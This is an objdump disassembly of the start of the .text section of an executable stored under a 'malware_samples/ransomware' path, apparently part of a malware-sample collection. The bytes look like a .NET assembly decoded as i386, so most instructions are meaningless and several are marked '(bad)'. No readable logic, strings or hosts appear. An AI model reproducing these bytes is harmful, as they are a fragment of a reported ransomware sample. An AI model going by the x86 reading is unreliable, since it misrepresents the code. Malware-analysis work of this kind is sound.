
malware_samples/ransomware/8eb09dc2383a16fa024f924c20a7648992a35ac2992279edefad50688aa84660.exe:     file format pei-i386


Disassembly of section .text:

00402000 <.text>:
  402000:	d0 a0 00 00 00 00    	shlb   $1,0x0(%eax)
  402006:	00 00                	add    %al,(%eax)
  402008:	48                   	dec    %eax
  402009:	00 00                	add    %al,(%eax)
  40200b:	00 02                	add    %al,(%edx)
  40200d:	00 05 00 d8 54 00    	add    %al,0x54d800
  402013:	00 c4                	add    %al,%ah
  402015:	4b                   	dec    %ebx
  402016:	00 00                	add    %al,(%eax)
  402018:	01 00                	add    %eax,(%eax)
  40201a:	00 00                	add    %al,(%eax)
  40201c:	77 00                	ja     0x40201e
  40201e:	00 06                	add    %al,(%esi)
  402020:	10 4a 00             	adc    %cl,0x0(%edx)
  402023:	00 c8                	add    %cl,%al
  402025:	0a 00                	or     (%eax),%al
	...
  40204f:	00 13                	add    %dl,(%ebx)
  402051:	30 0a                	xor    %cl,(%edx)
  402053:	00 ce                	add    %cl,%dh
  402055:	00 00                	add    %al,(%eax)
  402057:	00 01                	add    %al,(%ecx)
  402059:	00 00                	add    %al,(%eax)
  40205b:	11 72 01             	adc    %esi,0x1(%edx)
  40205e:	00 00                	add    %al,(%eax)
  402060:	70 20                	jo     0x402082
  402062:	80 00 00             	addb   $0x0,(%eax)
  402065:	00 73 0c             	add    %dh,0xc(%ebx)
  402068:	00 00                	add    %al,(%eax)
  40206a:	0a 0a                	or     (%edx),%cl
  40206c:	05 20 80 00 00       	add    $0x8020,%eax
  402071:	00 73 0c             	add    %dh,0xc(%ebx)
  402074:	00 00                	add    %al,(%eax)
  402076:	0a 0b                	or     (%ebx),%cl
  402078:	12 02                	adc    (%edx),%al
  40207a:	fe                   	(bad)
  40207b:	15 03 00 00 02       	adc    $0x2000003,%eax
  402080:	03 28                	add    (%eax),%ebp
  402082:	0d 00 00 0a 2d       	or     $0x2d0a0000,%eax
  402087:	08 12                	or     %dl,(%edx)
  402089:	02 03                	add    (%ebx),%al
  40208b:	7d 03                	jge    0x402090
  40208d:	00 00                	add    %al,(%eax)
  40208f:	04 02                	add    $0x2,%al
  402091:	28 0d 00 00 0a 2d    	sub    %cl,0x2d0a0000
  402097:	08 12                	or     %dl,(%edx)
  402099:	02 02                	add    (%edx),%al
  40209b:	7d 04                	jge    0x4020a1
  40209d:	00 00                	add    %al,(%eax)
  40209f:	04 12                	add    $0x12,%al
  4020a1:	02 08                	add    (%eax),%cl
  4020a3:	28 01                	sub    %al,(%ecx)
  4020a5:	00 00                	add    %al,(%eax)
  4020a7:	2b 7d 01             	sub    0x1(%ebp),%edi
  4020aa:	00 00                	add    %al,(%eax)
  4020ac:	04 16                	add    $0x16,%al
  4020ae:	0d 18 13 04 0e       	or     $0xe041318,%eax
  4020b3:	04 17                	add    $0x17,%al
  4020b5:	5f                   	pop    %edi
  4020b6:	17                   	pop    %ss
  4020b7:	33 1b                	xor    (%ebx),%ebx
  4020b9:	11 04 20             	adc    %eax,(%eax,%eiz,1)
  4020bc:	00 00                	add    %al,(%eax)
  4020be:	04 00                	add    $0x0,%al
  4020c0:	60                   	pusha
  4020c1:	13 04 0e             	adc    (%esi,%ecx,1),%eax
  4020c4:	05 18 5f 18 33       	add    $0x33185f18,%eax
  4020c9:	0a 11                	or     (%ecx),%dl
  4020cb:	04 20                	add    $0x20,%al
  4020cd:	80 00 00             	addb   $0x0,(%eax)
  4020d0:	00 60 13             	add    %ah,0x13(%eax)
  4020d3:	04 12                	add    $0x12,%al
  4020d5:	02 04 7e             	add    (%esi,%edi,2),%al
  4020d8:	0f 00 00             	sldt   (%eax)
  4020db:	0a 16                	or     (%esi),%dl
  4020dd:	07                   	pop    %es
  4020de:	20 80 00 00 00 06    	and    %al,0x6000000(%eax)
  4020e4:	20 80 00 00 00 12    	and    %al,0x12000000(%eax)
  4020ea:	03 11                	add    (%ecx),%edx
  4020ec:	04 28                	add    $0x28,%al
  4020ee:	01 00                	add    %eax,(%eax)
  4020f0:	00 06                	add    %al,(%esi)
  4020f2:	13 05 11 05 2d 30    	adc    0x302d0511,%eax
  4020f8:	73 04                	jae    0x4020fe
  4020fa:	00 00                	add    %al,(%eax)
  4020fc:	06                   	push   %es
  4020fd:	13 06                	adc    (%esi),%eax
  4020ff:	11 06                	adc    %eax,(%esi)
  402101:	07                   	pop    %es
  402102:	6f                   	outsl  %ds:(%esi),(%dx)
  402103:	10 00                	adc    %al,(%eax)
  402105:	00 0a                	add    %cl,(%edx)
  402107:	7d 21                	jge    0x40212a
  402109:	00 00                	add    %al,(%eax)
  40210b:	04 11                	add    $0x11,%al
  40210d:	06                   	push   %es
  40210e:	06                   	push   %es
  40210f:	6f                   	outsl  %ds:(%esi),(%dx)
  402110:	10 00                	adc    %al,(%eax)
  402112:	00 0a                	add    %cl,(%edx)
  402114:	7d 22                	jge    0x402138
  402116:	00 00                	add    %al,(%eax)
  402118:	04 11                	add    $0x11,%al
  40211a:	06                   	push   %es
  40211b:	72 01                	jb     0x40211e
  40211d:	00 00                	add    %al,(%eax)
  40211f:	70 7d                	jo     0x40219e
  402121:	23 00                	and    (%eax),%eax
  402123:	00 04 11             	add    %al,(%ecx,%edx,1)
  402126:	06                   	push   %es
  402127:	2a 14 2a             	sub    (%edx,%ebp,1),%dl
  40212a:	1e                   	push   %ds
  40212b:	02 28                	add    (%eax),%ch
  40212d:	11 00                	adc    %eax,(%eax)
  40212f:	00 0a                	add    %cl,(%edx)
  402131:	2a a2 02 7e 14 00    	sub    0x147e02(%edx),%ah
  402137:	00 0a                	add    %cl,(%edx)
  402139:	7d 21                	jge    0x40215c
  40213b:	00 00                	add    %al,(%eax)
  40213d:	04 02                	add    $0x2,%al
  40213f:	7e 14                	jle    0x402155
  402141:	00 00                	add    %al,(%eax)
  402143:	0a 7d 22             	or     0x22(%ebp),%bh
  402146:	00 00                	add    %al,(%eax)
  402148:	04 02                	add    $0x2,%al
  40214a:	7e 14                	jle    0x402160
  40214c:	00 00                	add    %al,(%eax)
  40214e:	0a 7d 23             	or     0x23(%ebp),%bh
  402151:	00 00                	add    %al,(%eax)
  402153:	04 02                	add    $0x2,%al
  402155:	28 11                	sub    %dl,(%ecx)
  402157:	00 00                	add    %al,(%eax)
  402159:	0a 2a                	or     (%edx),%ch
  40215b:	1e                   	push   %ds
  40215c:	02 7b 24             	add    0x24(%ebx),%bh
  40215f:	00 00                	add    %al,(%eax)
  402161:	04 2a                	add    $0x2a,%al
  402163:	22 02                	and    (%edx),%al
  402165:	03 7d 24             	add    0x24(%ebp),%edi
  402168:	00 00                	add    %al,(%eax)
  40216a:	04 2a                	add    $0x2a,%al
  40216c:	2a 1f                	sub    (%edi),%bl
  40216e:	78 1f                	js     0x40218f
  402170:	32 73 15             	xor    0x15(%ebx),%dh
  402173:	00 00                	add    %al,(%eax)
  402175:	0a 2a                	or     (%edx),%ch
  402177:	06                   	push   %es
  402178:	2a 22                	sub    (%edx),%ah
  40217a:	16                   	push   %ss
  40217b:	16                   	push   %ss
  40217c:	73 16                	jae    0x402194
  40217e:	00 00                	add    %al,(%eax)
  402180:	0a 2a                	or     (%edx),%ch
  402182:	06                   	push   %es
  402183:	2a 0e                	sub    (%esi),%cl
  402185:	1f                   	pop    %ds
  402186:	19 2a                	sbb    %ebp,(%edx)
  402188:	06                   	push   %es
  402189:	2a 00                	sub    (%eax),%al
  40218b:	00 03                	add    %al,(%ebx)
  40218d:	30 02                	xor    %al,(%edx)
  40218f:	00 53 00             	add    %dl,0x0(%ebx)
  402192:	00 00                	add    %al,(%eax)
  402194:	00 00                	add    %al,(%eax)
  402196:	00 00                	add    %al,(%eax)
  402198:	02 7b 26             	add    0x26(%ebx),%bh
  40219b:	00 00                	add    %al,(%eax)
  40219d:	04 2c                	add    $0x2c,%al
  40219f:	13 02                	adc    (%edx),%eax
  4021a1:	7b 26                	jnp    0x4021c9
  4021a3:	00 00                	add    %al,(%eax)
  4021a5:	04 6f                	add    $0x6f,%al
  4021a7:	17                   	pop    %ss
  4021a8:	00 00                	add    %al,(%eax)
  4021aa:	0a 02                	or     (%edx),%al
  4021ac:	14 7d                	adc    $0x7d,%al
  4021ae:	26 00 00             	add    %al,%es:(%eax)
  4021b1:	04 2a                	add    $0x2a,%al
  4021b3:	02 73 18             	add    0x18(%ebx),%dh
  4021b6:	00 00                	add    %al,(%eax)
  4021b8:	0a 7d 26             	or     0x26(%ebp),%bh
  4021bb:	00 00                	add    %al,(%eax)
  4021bd:	04 02                	add    $0x2,%al
  4021bf:	7b 26                	jnp    0x4021e7
  4021c1:	00 00                	add    %al,(%eax)
  4021c3:	04 23                	add    $0x23,%al
	...
  4021cd:	6f                   	outsl  %ds:(%esi),(%dx)
  4021ce:	19 00                	sbb    %eax,(%eax)
  4021d0:	00 0a                	add    %cl,(%edx)
  4021d2:	02 7b 26             	add    0x26(%ebx),%bh
  4021d5:	00 00                	add    %al,(%eax)
  4021d7:	04 16                	add    $0x16,%al
  4021d9:	6f                   	outsl  %ds:(%esi),(%dx)
  4021da:	1a 00                	sbb    (%eax),%al
  4021dc:	00 0a                	add    %cl,(%edx)
  4021de:	02 7b 26             	add    0x26(%ebx),%bh
  4021e1:	00 00                	add    %al,(%eax)
  4021e3:	04 17                	add    $0x17,%al
  4021e5:	6f                   	outsl  %ds:(%esi),(%dx)
  4021e6:	1b 00                	sbb    (%eax),%eax
  4021e8:	00 0a                	add    %cl,(%edx)
  4021ea:	2a 1e                	sub    (%esi),%bl
  4021ec:	02 7b 25             	add    0x25(%ebx),%bh
  4021ef:	00 00                	add    %al,(%eax)
  4021f1:	04 2a                	add    $0x2a,%al
  4021f3:	22 02                	and    (%edx),%al
  4021f5:	03 7d 25             	add    0x25(%ebp),%edi
  4021f8:	00 00                	add    %al,(%eax)
  4021fa:	04 2a                	add    $0x2a,%al
  4021fc:	13 30                	adc    (%eax),%esi
  4021fe:	05 00 7f 00 00       	add    $0x7f00,%eax
  402203:	00 02                	add    %al,(%edx)
  402205:	00 00                	add    %al,(%eax)
  402207:	11 0f                	adc    %ecx,(%edi)
  402209:	01 28                	add    %ebp,(%eax)
  40220b:	1c 00                	sbb    $0x0,%al
  40220d:	00 0a                	add    %cl,(%edx)
  40220f:	0f 01                	(bad)
  402211:	28 1d 00 00 0a 59    	sub    %bl,0x590a0000
  402217:	17                   	pop    %ss
  402218:	58                   	pop    %eax
  402219:	0f 01                	(bad)
  40221b:	28 1e                	sub    %bl,(%esi)
  40221d:	00 00                	add    %al,(%eax)
  40221f:	0a 0f                	or     (%edi),%cl
  402221:	01 28                	add    %ebp,(%eax)
  402223:	1f                   	pop    %ds
  402224:	00 00                	add    %al,(%eax)
  402226:	0a 59 17             	or     0x17(%ecx),%bl
  402229:	58                   	pop    %eax
  40222a:	73 20                	jae    0x40224c
  40222c:	00 00                	add    %al,(%eax)
  40222e:	0a 0a                	or     (%edx),%cl
  402230:	16                   	push   %ss
  402231:	0b 2b                	or     (%ebx),%ebp
  402233:	3f                   	aas
  402234:	16                   	push   %ss
  402235:	0c 2b                	or     $0x2b,%al
  402237:	25 06 07 08 28       	and    $0x28080706,%eax
  40223c:	21 00                	and    %eax,(%eax)
  40223e:	00 0a                	add    %cl,(%edx)
  402240:	1f                   	pop    %ds
  402241:	20 02                	and    %al,(%edx)
  402243:	7b 25                	jnp    0x40226a
  402245:	00 00                	add    %al,(%eax)
  402247:	04 02                	add    $0x2,%al
  402249:	7b 24                	jnp    0x40226f
  40224b:	00 00                	add    %al,(%eax)
  40224d:	04 16                	add    $0x16,%al
  40224f:	73 22                	jae    0x402273
  402251:	00 00                	add    %al,(%eax)
  402253:	0a 81 0e 00 00 01    	or     0x100000e(%ecx),%al
  402259:	08 17                	or     %dl,(%edi)
  40225b:	58                   	pop    %eax
  40225c:	0c 08                	or     $0x8,%al
  40225e:	0f 01                	(bad)
  402260:	28 1e                	sub    %bl,(%esi)
  402262:	00 00                	add    %al,(%eax)
  402264:	0a 0f                	or     (%edi),%cl
  402266:	01 28                	add    %ebp,(%eax)
  402268:	1f                   	pop    %ds
  402269:	00 00                	add    %al,(%eax)
  40226b:	0a 59 31             	or     0x31(%ecx),%bl
  40226e:	c9                   	leave
  40226f:	07                   	pop    %es
  402270:	17                   	pop    %ss
  402271:	58                   	pop    %eax
  402272:	0b 07                	or     (%edi),%eax
  402274:	0f 01                	(bad)
  402276:	28 1c 00             	sub    %bl,(%eax,%eax,1)
  402279:	00 0a                	add    %cl,(%edx)
  40227b:	0f 01                	(bad)
  40227d:	28 1d 00 00 0a 59    	sub    %bl,0x590a0000
  402283:	31 af 06 2a 0a 17    	xor    %ebp,0x170a2a06(%edi)
  402289:	2a 36                	sub    (%esi),%dh
  40228b:	20 f0                	and    %dh,%al
  40228d:	00 00                	add    %al,(%eax)
  40228f:	00 1f                	add    %bl,(%edi)
  402291:	54                   	push   %esp
  402292:	73 15                	jae    0x4022a9
  402294:	00 00                	add    %al,(%eax)
  402296:	0a 2a                	or     (%edx),%ch
  402298:	2a 1f                	sub    (%edi),%bl
  40229a:	78 1f                	js     0x4022bb
  40229c:	54                   	push   %esp
  40229d:	73 15                	jae    0x4022b4
  40229f:	00 00                	add    %al,(%eax)
  4022a1:	0a 2a                	or     (%edx),%ch
  4022a3:	9e                   	sahf
  4022a4:	03 1a                	add    (%edx),%ebx
  4022a6:	5f                   	pop    %edi
  4022a7:	2c 11                	sub    $0x11,%al
  4022a9:	72 01                	jb     0x4022ac
  4022ab:	00 00                	add    %al,(%eax)
  4022ad:	70 72                	jo     0x402321
  4022af:	01 00                	add    %eax,(%eax)
  4022b1:	00 70 17             	add    %dh,0x17(%eax)
  4022b4:	28 27                	sub    %ah,(%edi)
  4022b6:	00 00                	add    %al,(%eax)
  4022b8:	06                   	push   %es
  4022b9:	2a 72 01             	sub    0x1(%edx),%dh
  4022bc:	00 00                	add    %al,(%eax)
  4022be:	70 72                	jo     0x402332
  4022c0:	01 00                	add    %eax,(%eax)
  4022c2:	00 70 16             	add    %dh,0x16(%eax)
  4022c5:	28 27                	sub    %ah,(%edi)
  4022c7:	00 00                	add    %al,(%eax)
  4022c9:	06                   	push   %es
  4022ca:	2a 06                	sub    (%esi),%al
  4022cc:	2a 06                	sub    (%esi),%al
  4022ce:	2a 06                	sub    (%esi),%al
  4022d0:	2a 00                	sub    (%eax),%al
  4022d2:	00 00                	add    %al,(%eax)
  4022d4:	13 30                	adc    (%eax),%esi
  4022d6:	02 00                	add    (%eax),%al
  4022d8:	1a 00                	sbb    (%eax),%al
  4022da:	00 00                	add    %al,(%eax)
  4022dc:	03 00                	add    (%eax),%eax
  4022de:	00 11                	add    %dl,(%ecx)
  4022e0:	12 00                	adc    (%eax),%al
  4022e2:	fe                   	(bad)
  4022e3:	15 0d 00 00 01       	adc    $0x100000d,%eax
  4022e8:	12 00                	adc    (%eax),%al
  4022ea:	16                   	push   %ss
  4022eb:	28 23                	sub    %ah,(%ebx)
  4022ed:	00 00                	add    %al,(%eax)
  4022ef:	0a 12                	or     (%edx),%dl
  4022f1:	00 16                	add    %dl,(%esi)
  4022f3:	28 24 00             	sub    %ah,(%eax,%eax,1)
  4022f6:	00 0a                	add    %cl,(%edx)
  4022f8:	06                   	push   %es
  4022f9:	2a 06                	sub    (%esi),%al
  4022fb:	2a 13                	sub    (%ebx),%dl
  4022fd:	30 02                	xor    %al,(%edx)
  4022ff:	00 1c 00             	add    %bl,(%eax,%eax,1)
  402302:	00 00                	add    %al,(%eax)
  402304:	04 00                	add    $0x0,%al
  402306:	00 11                	add    %dl,(%ecx)
  402308:	12 00                	adc    (%eax),%al
  40230a:	fe                   	(bad)
  40230b:	15 0c 00 00 01       	adc    $0x100000c,%eax
  402310:	12 00                	adc    (%eax),%al
  402312:	1f                   	pop    %ds
  402313:	32 28                	xor    (%eax),%ch
  402315:	25 00 00 0a 12       	and    $0x120a0000,%eax
  40231a:	00 1f                	add    %bl,(%edi)
  40231c:	78 28                	js     0x402346
  40231e:	26 00 00             	add    %al,%es:(%eax)
  402321:	0a 06                	or     (%esi),%al
  402323:	2a 06                	sub    (%esi),%al
  402325:	2a 2e                	sub    (%esi),%ch
  402327:	28 27                	sub    %ah,(%edi)
  402329:	00 00                	add    %al,(%eax)
  40232b:	0a 6f 28             	or     0x28(%edi),%ch
  40232e:	00 00                	add    %al,(%eax)
  402330:	0a 2a                	or     (%edx),%ch
  402332:	06                   	push   %es
  402333:	2a 3e                	sub    (%esi),%bh
  402335:	02 1f                	add    (%edi),%bl
  402337:	0f 7d                	(bad)
  402339:	24 00                	and    $0x0,%al
  40233b:	00 04 02             	add    %al,(%edx,%eax,1)
  40233e:	28 29                	sub    %ch,(%ecx)
  402340:	00 00                	add    %al,(%eax)
  402342:	0a 2a                	or     (%edx),%ch
  402344:	1b 30                	sbb    (%eax),%esi
  402346:	05 00 51 02 00       	add    $0x25100,%eax
  40234b:	00 05 00 00 11 73    	add    %al,0x73110000
  402351:	18 00                	sbb    %al,(%eax)
  402353:	00 0a                	add    %cl,(%edx)
  402355:	0a 06                	or     (%esi),%al
  402357:	22 00                	and    (%eax),%al
  402359:	00 c0                	add    %al,%al
  40235b:	40                   	inc    %eax
  40235c:	22 00                	and    (%eax),%al
  40235e:	00 50 41             	add    %dl,0x41(%eax)
  402361:	73 2a                	jae    0x40238d
  402363:	00 00                	add    %al,(%eax)
  402365:	0a 6f 2b             	or     0x2b(%edi),%ch
  402368:	00 00                	add    %al,(%eax)
  40236a:	0a 06                	or     (%esi),%al
  40236c:	17                   	pop    %ss
  40236d:	6f                   	outsl  %ds:(%esi),(%dx)
  40236e:	2c 00                	sub    $0x0,%al
  402370:	00 0a                	add    %cl,(%edx)
  402372:	73 2d                	jae    0x4023a1
  402374:	00 00                	add    %al,(%eax)
  402376:	0a 0b                	or     (%ebx),%cl
  402378:	73 2e                	jae    0x4023a8
  40237a:	00 00                	add    %al,(%eax)
  40237c:	0a 0c 73             	or     (%ebx,%esi,2),%cl
  40237f:	2f                   	das
  402380:	00 00                	add    %al,(%eax)
  402382:	0a 0d 73 2f 00 00    	or     0x2f73,%cl
  402388:	0a 13                	or     (%ebx),%dl
  40238a:	04 03                	add    $0x3,%al
  40238c:	28 0d 00 00 0a 2c    	sub    %cl,0x2c0a0000
  402392:	1d 05 2c 0d 07       	sbb    $0x70d2c05,%eax
  402397:	72 03                	jb     0x40239c
  402399:	00 00                	add    %al,(%eax)
  40239b:	70 6f                	jo     0x40240c
  40239d:	30 00                	xor    %al,(%eax)
  40239f:	00 0a                	add    %cl,(%edx)
  4023a1:	2b 14 07             	sub    (%edi,%eax,1),%edx
  4023a4:	72 25                	jb     0x4023cb
  4023a6:	00 00                	add    %al,(%eax)
  4023a8:	70 6f                	jo     0x402419
  4023aa:	30 00                	xor    %al,(%eax)
  4023ac:	00 0a                	add    %cl,(%edx)
  4023ae:	2b 07                	sub    (%edi),%eax
  4023b0:	07                   	pop    %es
  4023b1:	03 6f 30             	add    0x30(%edi),%ebp
  4023b4:	00 00                	add    %al,(%eax)
  4023b6:	0a 07                	or     (%edi),%al
  4023b8:	1f                   	pop    %ds
  4023b9:	09 1f                	or     %ebx,(%edi)
  4023bb:	13 73 31             	adc    0x31(%ebx),%esi
  4023be:	00 00                	add    %al,(%eax)
  4023c0:	0a 6f 32             	or     0x32(%edi),%ch
  4023c3:	00 00                	add    %al,(%eax)
  4023c5:	0a 07                	or     (%edi),%al
  4023c7:	06                   	push   %es
  4023c8:	28 33                	sub    %dh,(%ebx)
  4023ca:	00 00                	add    %al,(%eax)
  4023cc:	0a 6f 34             	or     0x34(%edi),%ch
  4023cf:	00 00                	add    %al,(%eax)
  4023d1:	0a 13                	or     (%ebx),%dl
  4023d3:	08 12                	or     %dl,(%edx)
  4023d5:	08 28                	or     %ch,(%eax)
  4023d7:	35 00 00 0a 1b       	xor    $0x1b0a0000,%eax
  4023dc:	5a                   	pop    %edx
  4023dd:	1e                   	push   %ds
  4023de:	5b                   	pop    %ebx
  4023df:	1f                   	pop    %ds
  4023e0:	12 59 16             	adc    0x16(%ecx),%bl
  4023e3:	73 36                	jae    0x40241b
  4023e5:	00 00                	add    %al,(%eax)
  4023e7:	0a 6f 37             	or     0x37(%edi),%ch
  4023ea:	00 00                	add    %al,(%eax)
  4023ec:	0a 07                	or     (%edi),%al
  4023ee:	17                   	pop    %ss
  4023ef:	6f                   	outsl  %ds:(%esi),(%dx)
  4023f0:	38 00                	cmp    %al,(%eax)
  4023f2:	00 0a                	add    %cl,(%edx)
  4023f4:	06                   	push   %es
  4023f5:	6f                   	outsl  %ds:(%esi),(%dx)
  4023f6:	39 00                	cmp    %eax,(%eax)
  4023f8:	00 0a                	add    %cl,(%edx)
  4023fa:	07                   	pop    %es
  4023fb:	6f                   	outsl  %ds:(%esi),(%dx)
  4023fc:	3a 00                	cmp    (%eax),%al
  4023fe:	00 0a                	add    %cl,(%edx)
  402400:	05 2c 07 08 17       	add    $0x1708072c,%eax
  402405:	6f                   	outsl  %ds:(%esi),(%dx)
  402406:	3b 00                	cmp    (%eax),%eax
  402408:	00 0a                	add    %cl,(%edx)
  40240a:	08 04 50             	or     %al,(%eax,%edx,2)
  40240d:	6f                   	outsl  %ds:(%esi),(%dx)
  40240e:	30 00                	xor    %al,(%eax)
  402410:	00 0a                	add    %cl,(%edx)
  402412:	08 1f                	or     %bl,(%edi)
  402414:	0c 07                	or     $0x7,%al
  402416:	6f                   	outsl  %ds:(%esi),(%dx)
  402417:	3c 00                	cmp    $0x0,%al
  402419:	00 0a                	add    %cl,(%edx)
  40241b:	07                   	pop    %es
  40241c:	6f                   	outsl  %ds:(%esi),(%dx)
  40241d:	3d 00 00 0a 1f       	cmp    $0x1f0a0000,%eax
  402422:	0c 59                	or     $0x59,%al
  402424:	1f                   	pop    %ds
  402425:	14 6f                	adc    $0x6f,%al
  402427:	3e 00 00             	add    %al,%ds:(%eax)
  40242a:	0a 16                	or     (%esi),%dl
  40242c:	28 1f                	sub    %bl,(%edi)
  40242e:	00 00                	add    %al,(%eax)
  402430:	06                   	push   %es
  402431:	28 3f                	sub    %bh,(%edi)
  402433:	00 00                	add    %al,(%eax)
  402435:	0a 13                	or     (%ebx),%dl
  402437:	05 11 05 28 0d       	add    $0xd280511,%eax
  40243c:	00 00                	add    %al,(%eax)
  40243e:	0a 2c 0d 09 72 47 00 	or     0x477209(,%ecx,1),%ch
  402445:	00 70 6f             	add    %dh,0x6f(%eax)
  402448:	30 00                	xor    %al,(%eax)
  40244a:	00 0a                	add    %cl,(%edx)
  40244c:	2b 08                	sub    (%eax),%ecx
  40244e:	09 11                	or     %edx,(%ecx)
  402450:	05 6f 30 00 00       	add    $0x306f,%eax
  402455:	0a 17                	or     (%edi),%dl
  402457:	28 1f                	sub    %bl,(%edi)
  402459:	00 00                	add    %al,(%eax)
  40245b:	06                   	push   %es
  40245c:	28 3f                	sub    %bh,(%edi)
  40245e:	00 00                	add    %al,(%eax)
  402460:	0a 13                	or     (%ebx),%dl
  402462:	06                   	push   %es
  402463:	11 06                	adc    %eax,(%esi)
  402465:	28 0d 00 00 0a 2c    	sub    %cl,0x2c0a0000
  40246b:	0e                   	push   %cs
  40246c:	11 04 72             	adc    %eax,(%edx,%esi,2)
  40246f:	4d                   	dec    %ebp
  402470:	00 00                	add    %al,(%eax)
  402472:	70 6f                	jo     0x4024e3
  402474:	30 00                	xor    %al,(%eax)
  402476:	00 0a                	add    %cl,(%edx)
  402478:	2b 09                	sub    (%ecx),%ecx
  40247a:	11 04 11             	adc    %eax,(%ecx,%edx,1)
  40247d:	06                   	push   %es
  40247e:	6f                   	outsl  %ds:(%esi),(%dx)
  40247f:	30 00                	xor    %al,(%eax)
  402481:	00 0a                	add    %cl,(%edx)
  402483:	09 17                	or     %edx,(%edi)
  402485:	6f                   	outsl  %ds:(%esi),(%dx)
  402486:	40                   	inc    %eax
  402487:	00 00                	add    %al,(%eax)
  402489:	0a 11                	or     (%ecx),%dl
  40248b:	04 18                	add    $0x18,%al
  40248d:	6f                   	outsl  %ds:(%esi),(%dx)
  40248e:	40                   	inc    %eax
  40248f:	00 00                	add    %al,(%eax)
  402491:	0a 09                	or     (%ecx),%cl
  402493:	1f                   	pop    %ds
  402494:	0c 07                	or     $0x7,%al
  402496:	6f                   	outsl  %ds:(%esi),(%dx)
  402497:	3d 00 00 0a 20       	cmp    $0x200a0000,%eax
  40249c:	9e                   	sahf
  40249d:	00 00                	add    %al,(%eax)
  40249f:	00 59 28             	add    %bl,0x28(%ecx)
  4024a2:	41                   	inc    %ecx
  4024a3:	00 00                	add    %al,(%eax)
  4024a5:	0a 07                	or     (%edi),%al
  4024a7:	6f                   	outsl  %ds:(%esi),(%dx)
  4024a8:	3c 00                	cmp    $0x0,%al
  4024aa:	00 0a                	add    %cl,(%edx)
  4024ac:	1f                   	pop    %ds
  4024ad:	24 58                	and    $0x58,%al
  4024af:	1f                   	pop    %ds
  4024b0:	4b                   	dec    %ebx
  4024b1:	1f                   	pop    %ds
  4024b2:	17                   	pop    %ss
  4024b3:	6f                   	outsl  %ds:(%esi),(%dx)
  4024b4:	3e 00 00             	add    %al,%ds:(%eax)
  4024b7:	0a 11                	or     (%ecx),%dl
  4024b9:	04 1f                	add    $0x1f,%al
  4024bb:	5d                   	pop    %ebp
  4024bc:	07                   	pop    %es
  4024bd:	6f                   	outsl  %ds:(%esi),(%dx)
  4024be:	3d 00 00 0a 1f       	cmp    $0x1f0a0000,%eax
  4024c3:	4d                   	dec    %ebp
  4024c4:	59                   	pop    %ecx
  4024c5:	28 41 00             	sub    %al,0x0(%ecx)
  4024c8:	00 0a                	add    %cl,(%edx)
  4024ca:	07                   	pop    %es
  4024cb:	6f                   	outsl  %ds:(%esi),(%dx)
  4024cc:	3c 00                	cmp    $0x0,%al
  4024ce:	00 0a                	add    %cl,(%edx)
  4024d0:	1f                   	pop    %ds
  4024d1:	24 58                	and    $0x58,%al
  4024d3:	1f                   	pop    %ds
  4024d4:	4b                   	dec    %ebx
  4024d5:	1f                   	pop    %ds
  4024d6:	17                   	pop    %ss
  4024d7:	6f                   	outsl  %ds:(%esi),(%dx)
  4024d8:	3e 00 00             	add    %al,%ds:(%eax)
  4024db:	0a 02                	or     (%edx),%al
  4024dd:	28 0d 00 00 0a 2c    	sub    %cl,0x2c0a0000
  4024e3:	12 06                	adc    (%esi),%al
  4024e5:	28 27                	sub    %ah,(%edi)
  4024e7:	00 00                	add    %al,(%eax)
  4024e9:	0a 6f 28             	or     0x28(%edi),%ch
  4024ec:	00 00                	add    %al,(%eax)
  4024ee:	0a 6f 30             	or     0x30(%edi),%ch
  4024f1:	00 00                	add    %al,(%eax)
  4024f3:	0a 2b                	or     (%ebx),%ch
  4024f5:	07                   	pop    %es
  4024f6:	06                   	push   %es
  4024f7:	02 6f 30             	add    0x30(%edi),%ch
  4024fa:	00 00                	add    %al,(%eax)
  4024fc:	0a 06                	or     (%esi),%al
  4024fe:	20 b2 00 00 00 07    	and    %dh,0x7000000(%edx)
  402504:	6f                   	outsl  %ds:(%esi),(%dx)
  402505:	3d 00 00 0a 1f       	cmp    $0x1f0a0000,%eax
  40250a:	0a 58 28             	or     0x28(%eax),%bl
  40250d:	41                   	inc    %ecx
  40250e:	00 00                	add    %al,(%eax)
  402510:	0a 07                	or     (%edi),%al
  402512:	6f                   	outsl  %ds:(%esi),(%dx)
  402513:	3c 00                	cmp    $0x0,%al
  402515:	00 0a                	add    %cl,(%edx)
  402517:	1f                   	pop    %ds
  402518:	47                   	inc    %edi
  402519:	58                   	pop    %eax
  40251a:	73 36                	jae    0x402552
  40251c:	00 00                	add    %al,(%eax)
  40251e:	0a 6f 42             	or     0x42(%edi),%ch
  402521:	00 00                	add    %al,(%eax)
  402523:	0a 06                	or     (%esi),%al
  402525:	6f                   	outsl  %ds:(%esi),(%dx)
  402526:	39 00                	cmp    %eax,(%eax)
  402528:	00 0a                	add    %cl,(%edx)
  40252a:	19 8d 39 00 00 01    	sbb    %ecx,0x1000039(%ebp)
  402530:	13 09                	adc    (%ecx),%ecx
  402532:	11 09                	adc    %ecx,(%ecx)
  402534:	16                   	push   %ss
  402535:	08 a2 11 09 17 09    	or     %ah,0x9170911(%edx)
  40253b:	a2 11 09 18 11       	mov    %al,0x11180911
  402540:	04 a2                	add    $0xa2,%al
  402542:	11 09                	adc    %ecx,(%ecx)
  402544:	6f                   	outsl  %ds:(%esi),(%dx)
  402545:	43                   	inc    %ebx
  402546:	00 00                	add    %al,(%eax)
  402548:	0a 06                	or     (%esi),%al
  40254a:	19 6f 44             	sbb    %ebp,0x44(%edi)
  40254d:	00 00                	add    %al,(%eax)
  40254f:	0a 06                	or     (%esi),%al
  402551:	17                   	pop    %ss
  402552:	6f                   	outsl  %ds:(%esi),(%dx)
  402553:	45                   	inc    %ebp
  402554:	00 00                	add    %al,(%eax)
  402556:	0a 06                	or     (%esi),%al
  402558:	28 46 00             	sub    %al,0x0(%esi)
  40255b:	00 0a                	add    %cl,(%edx)
  40255d:	6f                   	outsl  %ds:(%esi),(%dx)
  40255e:	47                   	inc    %edi
  40255f:	00 00                	add    %al,(%eax)
  402561:	0a 28                	or     (%eax),%ch
  402563:	48                   	dec    %eax
  402564:	00 00                	add    %al,(%eax)
  402566:	0a 6f 49             	or     0x49(%edi),%ch
  402569:	00 00                	add    %al,(%eax)
  40256b:	0a de                	or     %dh,%bl
  40256d:	03 26                	add    (%esi),%esp
  40256f:	de 00                	fiadds (%eax)
  402571:	06                   	push   %es
  402572:	16                   	push   %ss
  402573:	6f                   	outsl  %ds:(%esi),(%dx)
  402574:	4a                   	dec    %edx
  402575:	00 00                	add    %al,(%eax)
  402577:	0a 06                	or     (%esi),%al
